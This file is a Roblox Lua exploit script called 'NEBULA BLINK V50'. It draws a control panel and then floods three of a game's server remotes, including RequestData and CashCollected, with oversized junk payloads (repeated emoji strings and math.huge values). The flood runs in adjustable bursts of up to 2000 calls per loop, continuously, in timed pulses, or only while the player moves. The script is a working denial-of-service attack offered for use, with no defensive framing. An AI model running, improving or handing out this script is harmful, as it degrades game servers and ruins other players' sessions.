local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local isActive = false
local pulseMode = false
local blinkMode = false
local power = 400 
local pulseInterval = 5

-- ========== TARGETE (AUTO-REPAIR) ==========
local function GetTargets()
    return {
        ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true),
        ReplicatedStorage:FindFirstChild("RF/ValentinesShopService/SearchUser", true),
        ReplicatedStorage:FindFirstChild("RE/PlotService/CashCollected", true)
    }
end
local targets = GetTargets()

-- ========== STATIC PAYLOAD ==========
local STATIC_VOID_PAYLOAD = {}
for i = 1, 10 do
    STATIC_VOID_PAYLOAD[HttpService:GenerateGUID(false):sub(1,6)] = {
        ["Data"] = string.rep("💣", 150),
        ["Math"] = { [i] = math.huge },
        ["Static"] = true
    }
end

-- ========== INTERFAȚĂ NEBULA ULTIMATE V50 ==========
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local Main = Instance.new("Frame", ScreenGui)
Main.Size, Main.Position = UDim2.new(0, 340, 0, 620), UDim2.new(0.5, -170, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
Main.Active = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
local Glow = Instance.new("UIStroke", Main)
Glow.Color, Glow.Thickness = Color3.fromRGB(180, 0, 255), 2

-- Dragging
local dragStart, startPos, dragging
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = Main.Position end end)
UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - dragStart Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Text = UDim2.new(1, 0, 0, 45), "NEBULA BLINK V50"
Title.TextColor3, Title.Font = Color3.fromRGB(200, 100, 255), Enum.Font.GothamBlack
Title.BackgroundTransparency, Title.TextSize = 1, 20

local function CreateSlider(name, pos, minVal, maxVal, default, callback)
    local Label = Instance.new("TextLabel", Main)
    Label.Size, Label.Position = UDim2.new(1, 0, 0, 20), pos
    Label.Text, Label.TextColor3, Label.BackgroundTransparency = name..": "..default, Color3.new(1,1,1), 1
    local Bar = Instance.new("Frame", Main)
    Bar.Size, Bar.Position = UDim2.new(0.8, 0, 0, 4), pos + UDim2.new(0.1, 0, 0, 25)
    Bar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    local Knob = Instance.new("TextButton", Bar)
    Knob.Size, Knob.Position = UDim2.new(0, 16, 0, 16), UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
    Knob.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
    Knob.Text = ""
    Instance.new("UICorner", Knob)
    Knob.MouseButton1Down:Connect(function()
        local move; move = RunService.RenderStepped:Connect(function()
            local p = math.clamp((player:GetMouse().X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
            Knob.Position = UDim2.new(p, -8, 0.5, -8)
            local val = math.floor(minVal + (p * (maxVal - minVal)))
            Label.Text = name .. ": " .. val
            callback(val)
        end)
        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
    end)
end

CreateSlider("STORM PRESSURE", UDim2.new(0, 0, 0.12, 0), 1, 2000, 400, function(v) power = v end)
CreateSlider("PULSE INTERVAL (SEC)", UDim2.new(0, 0, 0.23, 0), 1, 30, 5, function(v) pulseInterval = v end)

local function CreateToggle(text, pos, callback)
    local Btn = Instance.new("TextButton", Main)
    Btn.Size, Btn.Position = UDim2.new(0.8, 0, 0, 35), pos
    Btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Btn.Text, Btn.TextColor3 = text..": OFF", Color3.new(1,1,1)
    Instance.new("UICorner", Btn)
    local state = false
    Btn.MouseButton1Click:Connect(function()
        state = not state
        Btn.Text = text..": "..(state and "ON" or "OFF")
        Btn.BackgroundColor3 = state and Color3.fromRGB(180, 0, 255) or Color3.fromRGB(40, 40, 40)
        callback(state)
    end)
end

CreateToggle("PULSE MODE", UDim2.new(0.1, 0, 0.35, 0), function(s) pulseMode = s end)
CreateToggle("BLINK (ON MOVE)", UDim2.new(0.1, 0, 0.43, 0), function(s) blinkMode = s end)

local ActionBtn = Instance.new("TextButton", Main)
ActionBtn.Size, ActionBtn.Position = UDim2.new(0.8, 0, 0, 55), UDim2.new(0.1, 0, 0.58, 0)
ActionBtn.Text, ActionBtn.BackgroundColor3 = "INITIATE ANNIHILATION", Color3.fromRGB(0, 170, 100)
ActionBtn.TextColor3, ActionBtn.Font = Color3.new(1, 1, 1), Enum.Font.GothamBlack
Instance.new("UICorner", ActionBtn)

local AbortBtn = Instance.new("TextButton", Main)
AbortBtn.Size, AbortBtn.Position = UDim2.new(0.8, 0, 0, 50), UDim2.new(0.1, 0, 0.75, 0)
AbortBtn.Text, AbortBtn.BackgroundColor3 = "ABORT / CLEANUP", Color3.fromRGB(150, 0, 0)
AbortBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", AbortBtn)

-- ========== MOTOR HYBRID BLINK / PULSE ==========
local function IsMoving()
    return player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MoveDirection.Magnitude > 0
end

ActionBtn.MouseButton1Click:Connect(function()
    if isActive then return end
    isActive = true
    ActionBtn.Text = "SYSTEM OVERLOAD ACTIVE"
    ActionBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
    targets = GetTargets()
    
    task.spawn(function()
        while isActive do
            -- Logica BLINK: Dacă blink e ON, trimite pachete DOAR când te miști
            local shouldAttack = (not blinkMode) or (blinkMode and IsMoving())
            
            if shouldAttack then
                for i = 1, power do
                    if not isActive then break end
                    for _, r in pairs(targets) do
                        if r then
                            task.defer(function()
                                if r:IsA("RemoteEvent") then r:FireServer(STATIC_VOID_PAYLOAD)
                                elseif r:IsA("RemoteFunction") then r:InvokeServer(STATIC_VOID_PAYLOAD) end
                            end)
                        end
                    end
                    if i % 100 == 0 then RunService.Stepped:Wait() end
                end
            end
            
            -- Gestionare pauză
            if pulseMode and not blinkMode then
                task.wait(pulseInterval)
            else
                task.wait(0.01) -- Reacție ultra rapidă pentru Blink
            end
        end
    end)
end)

AbortBtn.MouseButton1Click:Connect(function()
    isActive = false
    ActionBtn.Text = "INITIATE ANNIHILATION"
    ActionBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 100)
    local char = player.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame
    end
end)
